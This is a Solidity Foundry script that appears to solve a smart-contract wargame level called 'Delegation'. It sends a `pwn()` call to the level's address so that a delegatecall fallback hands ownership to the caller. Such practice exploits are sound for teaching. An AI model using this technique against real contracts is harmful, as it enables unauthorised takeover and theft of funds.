//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";

contract DelegationAttack is Script {

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        address levelAddress = 0x545171056386C8cF8392774b61Cb2eb389a81a30;
        (bool success, ) = levelAddress.call(abi.encodeWithSignature("pwn()"));
        require(success, "FAILED TO CALL");

        vm.stopBroadcast();
        
    }
}

